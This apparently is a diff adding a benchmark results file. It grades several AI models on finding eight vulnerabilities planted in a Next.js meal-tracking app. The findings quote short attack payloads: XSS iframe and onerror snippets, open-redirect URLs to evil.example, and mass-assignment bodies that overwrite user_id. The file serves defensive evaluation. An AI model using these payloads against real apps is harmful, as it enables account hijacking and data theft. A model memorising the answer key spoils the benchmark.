@@ -1,0 +1,2477 @@
+{
+  "date": "2026-09-23T18:02:57.025Z",
+  "regradedAt": "2026-09-23T18:12:15.599Z",
+  "planted": [
+    {
+      "id": "V1",
+      "category": "authentication",
+      "file": "src/app/api/cron/maintenance/route.ts",
+      "line_start": 16,
+      "line_end": 16,
+      "match_ranges": [
+        [
+          13,
+          20
+        ]
+      ],
+      "summary": "Cron endpoint is open to anyone when CRON_SECRET is unset."
+    },
+    {
+      "id": "V2",
+      "category": "csrf",
+      "file": "src/app/api/whoop/callback/route.ts",
+      "line_start": 21,
+      "line_end": 21,
+      "match_ranges": [
+        [
+          14,
+          26
+        ]
+      ],
+      "summary": "OAuth state check is skipped when the state cookie is missing, so a forged callback links an attacker's Whoop account."
+    },
+    {
+      "id": "V3",
+      "category": "authorization",
+      "file": "src/lib/data/pushSubscriptions.ts",
+      "line_start": 46,
+      "line_end": 47,
+      "match_ranges": [
+        [
+          39,
+          48
+        ]
+      ],
+      "summary": "deleteSubscription ignores userId, so any signed-in user can delete another user's push subscription by endpoint."
+    },
+    {
+      "id": "V4",
+      "category": "authorization",
+      "file": "src/lib/actions/meals.ts",
+      "line_start": 172,
+      "line_end": 172,
+      "match_ranges": [
+        [
+          165,
+          176
+        ]
+      ],
+      "summary": "repeatMeal reads the source meal by id only, so a user can copy any other user's meal into their own log."
+    },
+    {
+      "id": "V5",
+      "category": "mass-assignment",
+      "file": "src/lib/actions/profile.ts",
+      "line_start": 109,
+      "line_end": 109,
+      "match_ranges": [
+        [
+          100,
+          121
+        ]
+      ],
+      "summary": "settingsSchema passes unknown keys through and the result is spread into the update, so a client can overwrite other profiles columns such as targets, coach rules or the AI provider."
+    },
+    {
+      "id": "V6",
+      "category": "secret-exposure",
+      "file": "src/lib/actions/aiSettings.ts",
+      "line_start": 203,
+      "line_end": 211,
+      "match_ranges": [
+        [
+          203,
+          211
+        ]
+      ],
+      "summary": "A server action returns the decrypted provider API key to the browser."
+    },
+    {
+      "id": "V7",
+      "category": "xss",
+      "file": "src/components/ui/Markdown.tsx",
+      "line_start": 53,
+      "line_end": 53,
+      "match_ranges": [
+        [
+          2,
+          2
+        ],
+        [
+          42,
+          57
+        ]
+      ],
+      "summary": "Coach replies are model output rendered with rehype-raw, so HTML in a reply (or injected into one) executes in the page."
+    },
+    {
+      "id": "V8",
+      "category": "open-redirect",
+      "file": "src/app/api/whoop/connect/route.ts",
+      "line_start": 12,
+      "line_end": 13,
+      "match_ranges": [
+        [
+          8,
+          16
+        ]
+      ],
+      "summary": "The next query parameter is used as a redirect target, and an absolute URL sends the user to any external site."
+    }
+  ],
+  "runs": [
+    {
+      "summary": {
+        "model": "explabs:deepseek-v4.1-flash",
+        "reps": 3,
+        "completed": 3,
+        "errors": 0,
+        "meanRecall": 0.875,
+        "meanPrecision": 1,
+        "unmatchedFindings": 0,
+        "duplicateFindings": 0,
+        "foundPerPlant": {
+          "V1": 3,
+          "V2": 3,
+          "V3": 3,
+          "V4": 3,
+          "V5": 3,
+          "V6": 0,
+          "V7": 3,
+          "V8": 3
+        },
+        "foundInEveryRep": [
+          "V1",
+          "V2",
+          "V3",
+          "V4",
+          "V5",
+          "V7",
+          "V8"
+        ],
+        "neverFound": [
+          "V6"
+        ],
+        "meanSecondsCompleted": 39.533
+      },
+      "reps": [
+        {
+          "rep": 1,
+          "ok": true,
+          "findings": [
+            {
+              "file": "src/app/api/cron/maintenance/route.ts",
+              "line": 16,
+              "category": "authentication",
+              "severity": "high",
+              "title": "Cron endpoint fails open when CRON_SECRET is unset",
+              "evidence": "`if (cronSecret && auth !== `Bearer ${cronSecret}`) { ...401 }` — the authorization check is skipped entirely when the env var is missing, so any unauthenticated attacker can GET /api/cron/maintenance and force expireStaleFacts/consolidateMemories/pruneEvents to run (data deletion plus AI cost)."
+            },
+            {
+              "file": "src/app/api/whoop/connect/route.ts",
+              "line": 13,
+              "category": "open-redirect",
+              "severity": "medium",
+              "title": "Unvalidated `next` query param used as redirect target",
+              "evidence": "`return NextResponse.redirect(new URL(next ?? \"/settings?whoop=env\", request.url));` — a logged-in user clicking /api/whoop/connect?next=https://evil.example is redirected off-site (the `new URL` constructor honors absolute attacker URLs), enabling credential-phishing redirects from a trusted origin."
+            },
+            {
+              "file": "src/app/api/whoop/callback/route.ts",
+              "line": 21,
+              "category": "csrf",
+              "severity": "medium",
+              "title": "OAuth state check skipped when the state cookie is absent",
+              "evidence": "`if (!code || (expected && state !== expected))` — if `whoop_oauth_state` is not present on the request (e.g. the victim is sent straight to /api/whoop/callback without visiting /connect), `expected` is undefined and the comparison is bypassed, letting an attacker complete the flow with their own WHOOP account and bind it to the victim's account."
+            },
+            {
+              "file": "src/lib/data/pushSubscriptions.ts",
+              "line": 46,
+              "category": "authorization",
+              "severity": "medium",
+              "title": "deleteSubscription ignores userId and deletes any user's subscription",
+              "evidence": "`.where(eq(push_subscriptions.endpoint, endpoint))` drops the ownership filter even though `userId` is a parameter, so DELETE /api/push/subscribe with another user's endpoint removes that victim's subscription row and silently disables their push notifications."
+            },
+            {
+              "file": "src/lib/actions/meals.ts",
+              "line": 172,
+              "category": "authorization",
+              "severity": "medium",
+              "title": "repeatMeal reads a meal by id without ownership check",
+              "evidence": "`db.select().from(meals).where(eq(meals.id, mealId))` (no `user_id` filter) — an authenticated attacker calls repeatMeal with another user's meal id and the meal's name, place and macros are copied into the attacker's own log, disclosing another user's data."
+            },
+            {
+              "file": "src/lib/actions/profile.ts",
+              "line": 117,
+              "category": "mass-assignment",
+              "severity": "medium",
+              "title": "updateProfileSettings spreads passthrough input into the DB update",
+              "evidence": "`settingsSchema` ends with `.passthrough()` (line 109) and the result is written as `.set({ ...data, updated_at: new Date() })`, so extra JSON keys sent by the client are written to the profiles row (e.g. overwriting `user_id` to hijack the profile row or setting fields such as `coach_rules`/`summary_rules` beyond their validated limits)."
+            },
+            {
+              "file": "src/components/ui/Markdown.tsx",
+              "line": 53,
+              "category": "xss",
+              "severity": "medium",
+              "title": "Raw HTML rendered without sanitization via rehype-raw",
+              "evidence": "`rehypePlugins={[rehypeRaw]}` renders raw HTML embedded in markdown (coach/AI output that can be steered by user-supplied text such as meal names) with no rehype-sanitize pass, so payloads like `<iframe srcdoc=\"<script>…</script>\">` are materialized into the DOM and executed in the app's origin."
+            }
+          ],
+          "seconds": 47.6,
+          "inputTokens": 10444,
+          "outputTokens": 6687,
+          "grade": {
+            "found": [
+              "V1",
+              "V2",
+              "V3",
+              "V4",
+              "V5",
+              "V7",
+              "V8"
+            ],
+            "missed": [
+              "V6"
+            ],
+            "matched": [
+              {
+                "finding": {
+                  "file": "src/app/api/cron/maintenance/route.ts",
+                  "line": 16,
+                  "category": "authentication",
+                  "severity": "high",
+                  "title": "Cron endpoint fails open when CRON_SECRET is unset",
+                  "evidence": "`if (cronSecret && auth !== `Bearer ${cronSecret}`) { ...401 }` — the authorization check is skipped entirely when the env var is missing, so any unauthenticated attacker can GET /api/cron/maintenance and force expireStaleFacts/consolidateMemories/pruneEvents to run (data deletion plus AI cost)."
+                },
+                "planted": "V1"
+              },
+              {
+                "finding": {
+                  "file": "src/app/api/whoop/connect/route.ts",
+                  "line": 13,
+                  "category": "open-redirect",
+                  "severity": "medium",
+                  "title": "Unvalidated `next` query param used as redirect target",
+                  "evidence": "`return NextResponse.redirect(new URL(next ?? \"/settings?whoop=env\", request.url));` — a logged-in user clicking /api/whoop/connect?next=https://evil.example is redirected off-site (the `new URL` constructor honors absolute attacker URLs), enabling credential-phishing redirects from a trusted origin."
+                },
+                "planted": "V8"
+              },
+              {
+                "finding": {
+                  "file": "src/app/api/whoop/callback/route.ts",
+                  "line": 21,
+                  "category": "csrf",
+                  "severity": "medium",
+                  "title": "OAuth state check skipped when the state cookie is absent",
+                  "evidence": "`if (!code || (expected && state !== expected))` — if `whoop_oauth_state` is not present on the request (e.g. the victim is sent straight to /api/whoop/callback without visiting /connect), `expected` is undefined and the comparison is bypassed, letting an attacker complete the flow with their own WHOOP account and bind it to the victim's account."
+                },
+                "planted": "V2"
+              },
+              {
+                "finding": {
+                  "file": "src/lib/data/pushSubscriptions.ts",
+                  "line": 46,
+                  "category": "authorization",
+                  "severity": "medium",
+                  "title": "deleteSubscription ignores userId and deletes any user's subscription",
+                  "evidence": "`.where(eq(push_subscriptions.endpoint, endpoint))` drops the ownership filter even though `userId` is a parameter, so DELETE /api/push/subscribe with another user's endpoint removes that victim's subscription row and silently disables their push notifications."
+                },
+                "planted": "V3"
+              },
+              {
+                "finding": {
+                  "file": "src/lib/actions/meals.ts",
+                  "line": 172,
+                  "category": "authorization",
+                  "severity": "medium",
+                  "title": "repeatMeal reads a meal by id without ownership check",
+                  "evidence": "`db.select().from(meals).where(eq(meals.id, mealId))` (no `user_id` filter) — an authenticated attacker calls repeatMeal with another user's meal id and the meal's name, place and macros are copied into the attacker's own log, disclosing another user's data."
+                },
+                "planted": "V4"
+              },
+              {
+                "finding": {
+                  "file": "src/lib/actions/profile.ts",
+                  "line": 117,
+                  "category": "mass-assignment",
+                  "severity": "medium",
+                  "title": "updateProfileSettings spreads passthrough input into the DB update",
+                  "evidence": "`settingsSchema` ends with `.passthrough()` (line 109) and the result is written as `.set({ ...data, updated_at: new Date() })`, so extra JSON keys sent by the client are written to the profiles row (e.g. overwriting `user_id` to hijack the profile row or setting fields such as `coach_rules`/`summary_rules` beyond their validated limits)."
+                },
+                "planted": "V5"
+              },
+              {
+                "finding": {
+                  "file": "src/components/ui/Markdown.tsx",
+                  "line": 53,
+                  "category": "xss",
+                  "severity": "medium",
+                  "title": "Raw HTML rendered without sanitization via rehype-raw",
+                  "evidence": "`rehypePlugins={[rehypeRaw]}` renders raw HTML embedded in markdown (coach/AI output that can be steered by user-supplied text such as meal names) with no rehype-sanitize pass, so payloads like `<iframe srcdoc=\"<script>…</script>\">` are materialized into the DOM and executed in the app's origin."
+                },
+                "planted": "V7"
+              }
+            ],
+            "duplicates": [],
+            "unmatched": [],
+            "recall": 0.875,
+            "precision": 1
+          }
+        },
+        {
+          "rep": 2,
+          "ok": true,
+          "findings": [
+            {
+              "file": "src/app/api/cron/maintenance/route.ts",
+              "line": 16,
+              "category": "authentication",
+              "severity": "high",
+              "title": "Cron maintenance endpoint is unauthenticated when CRON_SECRET is unset",
+              "evidence": "The guard is `if (cronSecret && auth !== \\`Bearer ${cronSecret}\\`)` — if `process.env.CRON_SECRET` is missing/empty the whole check is skipped. Any anonymous attacker can `GET /api/cron/maintenance` to repeatedly run `pruneEvents`/`expireStaleFacts`/`consolidateMemories` (destructive DB maintenance) and read the returned counts."
+            },
+            {
+              "file": "src/components/ui/Markdown.tsx",
+              "line": 53,
+              "category": "xss",
+              "severity": "high",
+              "title": "rehype-raw renders unsanitized raw HTML from markdown text (stored XSS)",
+              "evidence": "`rehypePlugins={[rehypeRaw]}` re-enables raw HTML parsing with no `rehype-sanitize`, and the only component overrides are for safe tags. Any markdown text sourced from model output / user content (e.g. a coach reply driven by prompt injection) containing `<iframe srcdoc=\"<script>fetch('/api/...')</script>\">` or similar is rendered as real DOM in the app origin, executing script with the victim's session."
+            },
+            {
+              "file": "src/app/api/whoop/connect/route.ts",
+              "line": 13,
+              "category": "open-redirect",
+              "severity": "low",
+              "title": "Unvalidated `next` query parameter passed to NextResponse.redirect",
+              "evidence": "`const next = new URL(request.url).searchParams.get(\"next\"); return NextResponse.redirect(new URL(next ?? \"/settings?whoop=env\", request.url));` — an attacker who sends a logged-in victim to `/api/whoop/connect?next=https://evil.example/phish` (or `//evil.example`) gets a redirect off-site from the trusted domain (reachable whenever Whoop env is not configured)."
+            },
+            {
+              "file": "src/app/api/whoop/callback/route.ts",
+              "line": 21,
+              "category": "csrf",
+              "severity": "medium",
+              "title": "OAuth state check skipped when the state cookie is absent",
+              "evidence": "`if (!code || (expected && state !== expected))` — `expected` comes from `request.cookies.get(\"whoop_oauth_state\")?.value`, so when the cookie is missing/expired the condition is false and any `state` value is accepted. An attacker can complete a Whoop OAuth flow for their own account, then lure the victim into `/api/whoop/callback?code=<attacker code>&state=x`, linking the attacker's Whoop data to the victim's account (login/account-linking CSRF)."
+            },
+            {
+              "file": "src/lib/data/pushSubscriptions.ts",
+              "line": 46,
+              "category": "authorization",
+              "severity": "medium",
+              "title": "deleteSubscription ignores userId, allowing deletion of any user's subscription",
+              "evidence": "`deleteSubscription(userId, endpoint)` builds `.where(eq(push_subscriptions.endpoint, endpoint))` — the `userId` argument is never used in the filter. A logged-in attacker who supplies a victim's push endpoint to `DELETE /api/push/subscribe` deletes the victim's subscription row (denial of notifications); the sibling `deleteSubscriptionByEndpoint` shows the ownership filter was dropped by mistake."
+            },
+            {
+              "file": "src/lib/actions/meals.ts",
+              "line": 172,
+              "category": "authorization",
+              "severity": "medium",
+              "title": "repeatMeal reads any user's meal by id (missing ownership check)",
+              "evidence": "`db.select().from(meals).where(eq(meals.id, mealId)).limit(1)` has no `eq(meals.user_id, user.id)` filter, unlike the update/delete actions. An authenticated attacker can call `repeatMeal({ mealId: <victim meal id>, category: \"lunch\", day: \"2024-01-01\" })` to copy another user's meal (name, place, macros, catalog_item_id) into their own account and read the data back."
+            },
+            {
+              "file": "src/lib/actions/profile.ts",
+              "line": 109,
+              "category": "mass-assignment",
+              "severity": "medium",
+              "title": "updateProfileSettings uses .passthrough() and spreads input into the DB update",
+              "evidence": "`settingsSchema` ends with `.passthrough()` and the action does `.set({ ...data, updated_at: new Date() })`, so every extra key the client sends is written to the `profiles` row (e.g. `{\"sex\":\"male\",\"birth_year\":null,\"height_cm\":null,\"timezone\":\"UTC\",\"day_cutoff_hour\":4,\"user_id\":\"<other-id>\",\"coach_rules\":\"...\"}`) — arbitrary column overwrite on the profile, bypassing the field whitelist and the dedicated rules/language actions."
+            }
+          ],
+          "seconds": 35.1,
+          "inputTokens": 10444,
+          "outputTokens": 4619,
+          "grade": {
+            "found": [
+              "V1",
+              "V2",
+              "V3",
+              "V4",
+              "V5",
+              "V7",
+              "V8"
+            ],
+            "missed": [
+              "V6"
+            ],
+            "matched": [
+              {
+                "finding": {
+                  "file": "src/app/api/cron/maintenance/route.ts",
+                  "line": 16,
+                  "category": "authentication",
+                  "severity": "high",
+                  "title": "Cron maintenance endpoint is unauthenticated when CRON_SECRET is unset",
+                  "evidence": "The guard is `if (cronSecret && auth !== \\`Bearer ${cronSecret}\\`)` — if `process.env.CRON_SECRET` is missing/empty the whole check is skipped. Any anonymous attacker can `GET /api/cron/maintenance` to repeatedly run `pruneEvents`/`expireStaleFacts`/`consolidateMemories` (destructive DB maintenance) and read the returned counts."
+                },
+                "planted": "V1"
+              },
+              {
+                "finding": {
+                  "file": "src/components/ui/Markdown.tsx",
+                  "line": 53,
+                  "category": "xss",
+                  "severity": "high",
+                  "title": "rehype-raw renders unsanitized raw HTML from markdown text (stored XSS)",
+                  "evidence": "`rehypePlugins={[rehypeRaw]}` re-enables raw HTML parsing with no `rehype-sanitize`, and the only component overrides are for safe tags. Any markdown text sourced from model output / user content (e.g. a coach reply driven by prompt injection) containing `<iframe srcdoc=\"<script>fetch('/api/...')</script>\">` or similar is rendered as real DOM in the app origin, executing script with the victim's session."
+                },
+                "planted": "V7"
+              },
+              {
+                "finding": {
+                  "file": "src/app/api/whoop/connect/route.ts",
+                  "line": 13,
+                  "category": "open-redirect",
+                  "severity": "low",
+                  "title": "Unvalidated `next` query parameter passed to NextResponse.redirect",
+                  "evidence": "`const next = new URL(request.url).searchParams.get(\"next\"); return NextResponse.redirect(new URL(next ?? \"/settings?whoop=env\", request.url));` — an attacker who sends a logged-in victim to `/api/whoop/connect?next=https://evil.example/phish` (or `//evil.example`) gets a redirect off-site from the trusted domain (reachable whenever Whoop env is not configured)."
+                },
+                "planted": "V8"
+              },
+              {
+                "finding": {
+                  "file": "src/app/api/whoop/callback/route.ts",
+                  "line": 21,
+                  "category": "csrf",
+                  "severity": "medium",
+                  "title": "OAuth state check skipped when the state cookie is absent",
+                  "evidence": "`if (!code || (expected && state !== expected))` — `expected` comes from `request.cookies.get(\"whoop_oauth_state\")?.value`, so when the cookie is missing/expired the condition is false and any `state` value is accepted. An attacker can complete a Whoop OAuth flow for their own account, then lure the victim into `/api/whoop/callback?code=<attacker code>&state=x`, linking the attacker's Whoop data to the victim's account (login/account-linking CSRF)."
+                },
+                "planted": "V2"
+              },
+              {
+                "finding": {
+                  "file": "src/lib/data/pushSubscriptions.ts",
+                  "line": 46,
+                  "category": "authorization",
+                  "severity": "medium",
+                  "title": "deleteSubscription ignores userId, allowing deletion of any user's subscription",
+                  "evidence": "`deleteSubscription(userId, endpoint)` builds `.where(eq(push_subscriptions.endpoint, endpoint))` — the `userId` argument is never used in the filter. A logged-in attacker who supplies a victim's push endpoint to `DELETE /api/push/subscribe` deletes the victim's subscription row (denial of notifications); the sibling `deleteSubscriptionByEndpoint` shows the ownership filter was dropped by mistake."
+                },
+                "planted": "V3"
+              },
+              {
+                "finding": {
+                  "file": "src/lib/actions/meals.ts",
+                  "line": 172,
+                  "category": "authorization",
+                  "severity": "medium",
+                  "title": "repeatMeal reads any user's meal by id (missing ownership check)",
+                  "evidence": "`db.select().from(meals).where(eq(meals.id, mealId)).limit(1)` has no `eq(meals.user_id, user.id)` filter, unlike the update/delete actions. An authenticated attacker can call `repeatMeal({ mealId: <victim meal id>, category: \"lunch\", day: \"2024-01-01\" })` to copy another user's meal (name, place, macros, catalog_item_id) into their own account and read the data back."
+                },
+                "planted": "V4"
+              },
+              {
+                "finding": {
+                  "file": "src/lib/actions/profile.ts",
+                  "line": 109,
+                  "category": "mass-assignment",
+                  "severity": "medium",
+                  "title": "updateProfileSettings uses .passthrough() and spreads input into the DB update",
+                  "evidence": "`settingsSchema` ends with `.passthrough()` and the action does `.set({ ...data, updated_at: new Date() })`, so every extra key the client sends is written to the `profiles` row (e.g. `{\"sex\":\"male\",\"birth_year\":null,\"height_cm\":null,\"timezone\":\"UTC\",\"day_cutoff_hour\":4,\"user_id\":\"<other-id>\",\"coach_rules\":\"...\"}`) — arbitrary column overwrite on the profile, bypassing the field whitelist and the dedicated rules/language actions."
+                },
+                "planted": "V5"
+              }
+            ],
+            "duplicates": [],
+            "unmatched": [],
+            "recall": 0.875,
+            "precision": 1
+          }
+        },
+        {
+          "rep": 3,
+          "ok": true,
+          "findings": [
+            {
+              "file": "src/components/ui/Markdown.tsx",
+              "line": 53,
+              "category": "xss",
+              "severity": "high",
+              "title": "Raw HTML rendering via rehype-raw without sanitization enables stored XSS",
+              "evidence": "`rehypePlugins={[rehypeRaw]}` re-enables raw HTML nodes in the markdown that is rendered with `ReactMarkdown`; the only component overrides are stylistic, so nothing strips event handlers or tags. Attacker input reaching this component (e.g. AI/coach-generated text or user-supplied coach rules/summary text) such as `<img src=x onerror=\"fetch('/api/push/subscribe',{method:'DELETE',...})\">` is parsed into a real DOM element and executes in the victim's authenticated session."
+            },
+            {
+              "file": "src/app/api/cron/maintenance/route.ts",
+              "line": 16,
+              "category": "authentication",
+              "severity": "high",
+              "title": "Cron endpoint fails open when CRON_SECRET is unset",
+              "evidence": "`if (cronSecret && auth !== \\`Bearer ${cronSecret}\\`)` skips authentication entirely when the environment variable is missing/empty. Any unauthenticated attacker can then `GET /api/cron/maintenance` and trigger `expireStaleFacts()`, `consolidateMemories()` and `pruneEvents()` across all users' data."
+            },
+            {
+              "file": "src/lib/actions/meals.ts",
+              "line": 172,
+              "category": "authorization",
+              "severity": "medium",
+              "title": "repeatMeal reads any user's meal by id (IDOR data leak)",
+              "evidence": "`const source = await db.select().from(meals).where(eq(meals.id, mealId)).limit(1)` has no `user_id` predicate, unlike every other query in this file. An authenticated attacker calls the `repeatMeal` server action with an arbitrary `mealId` and the victim's meal name, place, macros and fat quality are copied into the attacker's own day and returned/displayed."
+            },
+            {
+              "file": "src/lib/data/pushSubscriptions.ts",
+              "line": 46,
+              "category": "authorization",
+              "severity": "medium",
+              "title": "deleteSubscription ignores userId and deletes other users' subscriptions",
+              "evidence": "`deleteSubscription(userId, endpoint)` runs `.delete(push_subscriptions).where(eq(push_subscriptions.endpoint, endpoint))` — the `userId` argument is never used in the WHERE clause. Any authenticated caller of `DELETE /api/push/subscribe` who knows/guesses a victim's push endpoint can silently disable that victim's notifications (endpoints are also leaked to the client by `getSubscriptionsForUser` consumers)."
+            },
+            {
+              "file": "src/app/api/whoop/callback/route.ts",
+              "line": 21,
+              "category": "csrf",
+              "severity": "medium",
+              "title": "OAuth state check is skipped when the state cookie is absent",
+              "evidence": "`if (!code || (expected && state !== expected))` only validates `state` when the `whoop_oauth_state` cookie is present; an attacker-supplied request with no cookie bypasses the check. The attacker obtains a Whoop `code` for their own account, then gets the logged-in victim to open `/api/whoop/callback?code=<attacker code>` (cookie absent), causing the victim's account to be linked to the attacker's Whoop account (`connectWhoop(user.id, code)`)."
+            },
+            {
+              "file": "src/app/api/whoop/connect/route.ts",
+              "line": 13,
+              "category": "open-redirect",
+              "severity": "medium",
+              "title": "Unvalidated `next` query parameter used as redirect target",
+              "evidence": "`return NextResponse.redirect(new URL(next ?? \"/settings?whoop=env\", request.url));` feeds attacker-controlled input into `new URL`. A logged-in victim visiting `/api/whoop/connect?next=https://evil.example/phish` (or `?next=//evil.example`) is redirected off-site from the trusted origin, enabling credential-phishing flows."
+            },
+            {
+              "file": "src/lib/actions/profile.ts",
+              "line": 117,
+              "category": "mass-assignment",
+              "severity": "high",
+              "title": "settingsSchema.passthrough() spread into profiles update allows arbitrary column writes",
+              "evidence": "`settingsSchema` is declared with `.passthrough()` and the result is spread directly: `.set({ ...data, updated_at: new Date() })`. An attacker calling the `updateProfileSettings` server action with `{\"sex\":\"male\",\"birth_year\":null,\"height_cm\":null,\"timezone\":\"UTC\",\"day_cutoff_hour\":0,\"user_id\":\"<other-user-id>\",\"coach_rules\":\"...\",\"summary_rules\":\"...\"}` writes any `profiles` column of their row — including ownership (`user_id`) and fields that have dedicated validated/limited setters elsewhere — bypassing all per-field validation."
+            }
+          ],
+          "seconds": 35.9,
+          "inputTokens": 10444,
+          "outputTokens": 4722,
+          "grade": {
+            "found": [
+              "V1",
+              "V2",
+              "V3",
+              "V4",
+              "V5",
+              "V7",
+              "V8"
+            ],
+            "missed": [
+              "V6"
+            ],
+            "matched": [
+              {
+                "finding": {
+                  "file": "src/components/ui/Markdown.tsx",
+                  "line": 53,
+                  "category": "xss",
+                  "severity": "high",
+                  "title": "Raw HTML rendering via rehype-raw without sanitization enables stored XSS",
+                  "evidence": "`rehypePlugins={[rehypeRaw]}` re-enables raw HTML nodes in the markdown that is rendered with `ReactMarkdown`; the only component overrides are stylistic, so nothing strips event handlers or tags. Attacker input reaching this component (e.g. AI/coach-generated text or user-supplied coach rules/summary text) such as `<img src=x onerror=\"fetch('/api/push/subscribe',{method:'DELETE',...})\">` is parsed into a real DOM element and executes in the victim's authenticated session."
+                },
+                "planted": "V7"
+              },
+              {
+                "finding": {
+                  "file": "src/app/api/cron/maintenance/route.ts",
+                  "line": 16,
+                  "category": "authentication",
+                  "severity": "high",
+                  "title": "Cron endpoint fails open when CRON_SECRET is unset",
+                  "evidence": "`if (cronSecret && auth !== \\`Bearer ${cronSecret}\\`)` skips authentication entirely when the environment variable is missing/empty. Any unauthenticated attacker can then `GET /api/cron/maintenance` and trigger `expireStaleFacts()`, `consolidateMemories()` and `pruneEvents()` across all users' data."
+                },
+                "planted": "V1"
+              },
+              {
+                "finding": {
+                  "file": "src/lib/actions/meals.ts",
+                  "line": 172,
+                  "category": "authorization",
+                  "severity": "medium",
+                  "title": "repeatMeal reads any user's meal by id (IDOR data leak)",
+                  "evidence": "`const source = await db.select().from(meals).where(eq(meals.id, mealId)).limit(1)` has no `user_id` predicate, unlike every other query in this file. An authenticated attacker calls the `repeatMeal` server action with an arbitrary `mealId` and the victim's meal name, place, macros and fat quality are copied into the attacker's own day and returned/displayed."
+                },
+                "planted": "V4"
+              },
+              {
+                "finding": {
+                  "file": "src/lib/data/pushSubscriptions.ts",
+                  "line": 46,
+                  "category": "authorization",
+                  "severity": "medium",
+                  "title": "deleteSubscription ignores userId and deletes other users' subscriptions",
+                  "evidence": "`deleteSubscription(userId, endpoint)` runs `.delete(push_subscriptions).where(eq(push_subscriptions.endpoint, endpoint))` — the `userId` argument is never used in the WHERE clause. Any authenticated caller of `DELETE /api/push/subscribe` who knows/guesses a victim's push endpoint can silently disable that victim's notifications (endpoints are also leaked to the client by `getSubscriptionsForUser` consumers)."
+                },
+                "planted": "V3"
+              },
+              {
+                "finding": {
+                  "file": "src/app/api/whoop/callback/route.ts",
+                  "line": 21,
+                  "category": "csrf",
+                  "severity": "medium",
+                  "title": "OAuth state check is skipped when the state cookie is absent",
+                  "evidence": "`if (!code || (expected && state !== expected))` only validates `state` when the `whoop_oauth_state` cookie is present; an attacker-supplied request with no cookie bypasses the check. The attacker obtains a Whoop `code` for their own account, then gets the logged-in victim to open `/api/whoop/callback?code=<attacker code>` (cookie absent), causing the victim's account to be linked to the attacker's Whoop account (`connectWhoop(user.id, code)`)."
+                },
+                "planted": "V2"
+              },
+              {
+                "finding": {
+                  "file": "src/app/api/whoop/connect/route.ts",
+                  "line": 13,
+                  "category": "open-redirect",
+                  "severity": "medium",
+                  "title": "Unvalidated `next` query parameter used as redirect target",
+                  "evidence": "`return NextResponse.redirect(new URL(next ?? \"/settings?whoop=env\", request.url));` feeds attacker-controlled input into `new URL`. A logged-in victim visiting `/api/whoop/connect?next=https://evil.example/phish` (or `?next=//evil.example`) is redirected off-site from the trusted origin, enabling credential-phishing flows."
+                },
+                "planted": "V8"
+              },
+              {
+                "finding": {
+                  "file": "src/lib/actions/profile.ts",
+                  "line": 117,
+                  "category": "mass-assignment",
+                  "severity": "high",
+                  "title": "settingsSchema.passthrough() spread into profiles update allows arbitrary column writes",
+                  "evidence": "`settingsSchema` is declared with `.passthrough()` and the result is spread directly: `.set({ ...data, updated_at: new Date() })`. An attacker calling the `updateProfileSettings` server action with `{\"sex\":\"male\",\"birth_year\":null,\"height_cm\":null,\"timezone\":\"UTC\",\"day_cutoff_hour\":0,\"user_id\":\"<other-user-id>\",\"coach_rules\":\"...\",\"summary_rules\":\"...\"}` writes any `profiles` column of their row — including ownership (`user_id`) and fields that have dedicated validated/limited setters elsewhere — bypassing all per-field validation."
+                },
+                "planted": "V5"
+              }
+            ],
+            "duplicates": [],
+            "unmatched": [],
+            "recall": 0.875,
+            "precision": 1
+          }
+        }
+      ]
+    },
+    {
+      "summary": {
+        "model": "explabs:glm-5.3",
+        "reps": 3,
+        "completed": 2,
+        "errors": 1,
+        "meanRecall": 0.875,
+        "meanPrecision": 1,
+        "unmatchedFindings": 0,
+        "duplicateFindings": 0,
+        "foundPerPlant": {
+          "V1": 2,
+          "V2": 2,
+          "V3": 2,
+          "V4": 2,
+          "V5": 2,
+          "V6": 0,
+          "V7": 2,
+          "V8": 2
+        },
+        "foundInEveryRep": [
+          "V1",
+          "V2",
+          "V3",
+          "V4",
+          "V5",
+          "V7",
+          "V8"
+        ],
+        "neverFound": [
+          "V6"
+        ],
+        "meanSecondsCompleted": 213.15
+      },
+      "reps": [
+        {
+          "rep": 1,
+          "ok": true,
+          "findings": [
+            {
+              "file": "src/app/api/whoop/connect/route.ts",
+              "line": 13,
+              "category": "open-redirect",
+              "severity": "medium",
+              "title": "Unvalidated `next` parameter allows open redirect",
+              "evidence": "`return NextResponse.redirect(new URL(next ?? \"/settings?whoop=env\", request.url))` — `new URL` ignores the base when `next` is absolute, so `GET /api/whoop/connect?next=https://evil.com` (when Whoop env vars are absent) redirects the logged-in victim to an attacker-controlled site for phishing/credential capture."
+            },
+            {
+              "file": "src/app/api/whoop/callback/route.ts",
+              "line": 21,
+              "category": "csrf",
+              "severity": "medium",
+              "title": "OAuth state validation fails open when the state cookie is missing",
+              "evidence": "`if (!code || (expected && state !== expected))` — when the `whoop_oauth_state` cookie is absent the state comparison is skipped entirely, so an attacker who obtains an authorization code for their own Whoop account can send the logged-in victim `/api/whoop/callback?code=ATTACKER_CODE` and silently link the attacker's Whoop account to the victim's profile (OAuth login-CSRF)."
+            },
+            {
+              "file": "src/app/api/cron/maintenance/route.ts",
+              "line": 16,
+              "category": "authentication",
+              "severity": "medium",
+              "title": "Cron endpoint authentication fails open when CRON_SECRET is unset",
+              "evidence": "`if (cronSecret && auth !== `Bearer ${cronSecret}`)` — if the CRON_SECRET env var is not configured the check is skipped, so any unauthenticated attacker can GET this route and trigger `pruneEvents`/`expireStaleFacts`/`consolidateMemories`, destructively modifying/pruning all users' data on demand."
+            },
+            {
+              "file": "src/lib/data/pushSubscriptions.ts",
+              "line": 46,
+              "category": "authorization",
+              "severity": "medium",
+              "title": "deleteSubscription ignores its userId parameter (cross-user deletion)",
+              "evidence": "`deleteSubscription(userId, endpoint)` deletes `.where(eq(push_subscriptions.endpoint, endpoint))` with no `user_id` condition, so any authenticated user can `DELETE /api/push/subscribe` with a victim's endpoint and delete the victim's push subscription (silent notification DoS)."
+            },
+            {
+              "file": "src/lib/actions/meals.ts",
+              "line": 172,
+              "category": "authorization",
+              "severity": "medium",
+              "title": "repeatMeal reads another user's meal without user_id scoping (IDOR)",
+              "evidence": "`repeatMeal` selects `from(meals).where(eq(meals.id, mealId))` with no `eq(meals.user_id, user.id)` filter (unlike updateMeal/deleteMeal), then copies the row's name, place and macros into the caller's account — an attacker who learns another user's mealId can exfiltrate that user's meal data."
+            },
+            {
+              "file": "src/lib/actions/profile.ts",
+              "line": 117,
+              "category": "mass-assignment",
+              "severity": "high",
+              "title": "updateProfileSettings spreads passthrough zod keys directly into the DB update",
